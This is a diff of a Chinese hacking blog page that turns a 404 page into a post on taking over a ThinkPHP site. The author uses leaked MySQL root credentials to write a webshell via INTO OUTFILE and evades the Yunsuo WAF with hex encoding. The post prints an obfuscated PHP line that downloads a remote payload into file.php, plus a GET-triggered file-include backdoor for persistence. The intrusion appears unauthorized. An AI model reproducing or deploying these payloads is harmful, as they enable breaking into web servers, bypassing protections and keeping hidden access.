@@ -6,27 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://fjhack.me">
-  <title>晚睡早起学习好！</title>
+  <title>利用MySQLROOT权限远程下载脚本绕过云锁拿shell | 晚睡早起学习好！</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="]\
-	
-	
-	404">
-<meta property="og:type" content="website">
-<meta property="og:title" content="晚睡早起学习好！">
-<meta property="og:url" content="http://fjhack.me/404.html">
+  <meta name="description" content="碰到个阿里云盾+安全狗+云锁+thinkphp的站，其实也没什么思路，前台上传有JS的验证，后端还有白名单，只是运气好，扫出个备份文件，得到其数据库账户，连接之。
+连接上，通过查看MySQL数据库下的user表，发现是root用户的权限和当前用户是一样的，那么就是root 了。思路，找到后台账户密码，登录之，发现也没什么利用的，上传点和前台一样白名单。
+换思路，利用MySQL写文件函数，写shel">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用MySQLROOT权限远程下载脚本绕过云锁拿shell">
+<meta property="og:url" content="http://fjhack.me/2017/04/04/03/index.html">
 <meta property="og:site_name" content="晚睡早起学习好！">
-<meta property="og:description" content="]\
-	
-	
-	404">
-<meta property="og:updated_time" content="2017-04-04T18:14:52.519Z">
+<meta property="og:description" content="碰到个阿里云盾+安全狗+云锁+thinkphp的站，其实也没什么思路，前台上传有JS的验证，后端还有白名单，只是运气好，扫出个备份文件，得到其数据库账户，连接之。
+连接上，通过查看MySQL数据库下的user表，发现是root用户的权限和当前用户是一样的，那么就是root 了。思路，找到后台账户密码，登录之，发现也没什么利用的，上传点和前台一样白名单。
+换思路，利用MySQL写文件函数，写shel">
+<meta property="og:updated_time" content="2017-04-04T14:18:09.950Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="晚睡早起学习好！">
-<meta name="twitter:description" content="]\
-	
-	
-	404">
+<meta name="twitter:title" content="利用MySQLROOT权限远程下载脚本绕过云锁拿shell">
+<meta name="twitter:description" content="碰到个阿里云盾+安全狗+云锁+thinkphp的站，其实也没什么思路，前台上传有JS的验证，后端还有白名单，只是运气好，扫出个备份文件，得到其数据库账户，连接之。
+连接上，通过查看MySQL数据库下的user表，发现是root用户的权限和当前用户是一样的，那么就是root 了。思路，找到后台账户密码，登录之，发现也没什么利用的，上传点和前台一样白名单。
+换思路，利用MySQL写文件函数，写shel">
   
     <link rel="alternative" href="/atom.xml" title="晚睡早起学习好！" type="application/atom+xml">
   
@@ -162,22 +159,39 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="page-undefined" class="article article-type-page " itemscope itemprop="blogPost">
+            <article id="post-03" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      利用MySQLROOT权限远程下载脚本绕过云锁拿shell
+    </h1>
+  
+
+        
+        <a href="/2017/04/04/03/" class="archive-article-date">
+  	<time datetime="2017-04-04T13:20:00.950Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-04</time>
+</a>
+        
+      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <!DOCTYPE html>
-<html lang="en">
-<head>]\
-	
-	<meta charset="UTF-8">
-	<title>404</title>
-</head>
-<body>
-	<script type="text/javascript" src="http://www.qq.com/404/search_children.js" charset="utf-8"></script>
-</body>
-</html>
+        <p>碰到个阿里云盾+安全狗+云锁+thinkphp的站，其实也没什么思路，前台上传有JS的验证，后端还有白名单，只是运气好，扫出个备份文件，得到其数据库账户，连接之。</p>
+<p>连接上，通过查看MySQL<br>数据库下的user表，发现是root用户的权限和当前用户是一样的，那么就是root 了。<br>思路，找到后台账户密码，登录之，发现也没什么利用的，上传点和前台一样白名单。</p>
+<p>换思路，利用MySQL写文件函数，写shell进网站的目录，首先需要知道网站的绝对路径，利用thinkPHP的报错特性，爆出绝对路径。<br><a id="more"></a><br>直接执行SQL语句</p>
+<p>select ‘一句话’ into outfile ‘D://thinkhphp//xx//1.php’</p>
+<p>注意：云锁如果不检测写入的内容的话可以直接写明文， 但是最好写hex加密代码，那么代码就不需要单引号括起来，还要注意的就是，写绝对路径必须写两个“/”,除非写\，否则会被转义。</p>
+<p>本机测试，成功写入一句话，但是连接的时候被云锁拦截了，个人感觉可能是云锁拦截了post的特征，需要修改菜刀的连接特征，可惜我不会。<br>.<br>直接写入大马测试，nosafe的大马可以正常使用，直接写入大马，发现大马字符太大没办法写入，这时候利用95zz发的一个脚本，执行远程下载，他在文章中说因为云锁是拦截php代码的，例如&lt;? ?&gt;，的头部，所以远程下载的脚本是利用JavaScript转写php</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script language=<span class="string">"php"</span>&gt; <span class="variable">$a</span>=<span class="string">'http://远程地址/sss.txt'</span>;<span class="variable">$b</span>=<span class="string">'file'</span>.<span class="string">'_g'</span>.<span class="string">'et_'</span>.<span class="string">'contents'</span>;<span class="variable">$b</span> = <span class="variable">$b</span>(<span class="variable">$a</span>);file_put_contents(<span class="string">'file.php'</span>,<span class="variable">$b</span>); &lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure>
+<p>这行代码是利用一个远程下载函数，将远程服务器的文件下载，并重新生成一个file.php的php代码，所以我们在自己的web服务器上放上大马的txt，配合利用MySQL的文件写入先生成一个远程下载的php，在直接访问这个php，生成一个php大马，测试通过，成功getshell，尝试提权，无法使用大部分cmd提权命令，目的只需要shell权限就好，没有深究，做了一个文件包含，固权，退之。</p>
+<p>包含脚本：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span></div><div class="line"></div><div class="line">(<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>]))</div><div class="line"></div><div class="line">&#123;<span class="keyword">require_once</span>(<span class="string">'D:\\WWW\\web\\images\\load.jpg'</span>);&#125;</div></pre></td></tr></table></figure><br>注意闭合。</p>
+<!-- UY BEGIN -->
+<p><div id="uyan_frame"></div></p>
+<p><script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2129863"></script><br><!-- UY END --></p>
+
       
 
       
@@ -206,6 +220,21 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">绕过Waf</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透思路</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -256,7 +285,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://fjhack.me/404.html" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://fjhack.me/2017/04/04/03/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -268,6 +297,16 @@
 </article>
 
   
+<nav id="article-nav">
+  
+  
+    <a href="/2017/04/03/02/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">IIS6.0远程代码执行漏洞个人浅析</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 
 
@@ -301,7 +340,7 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
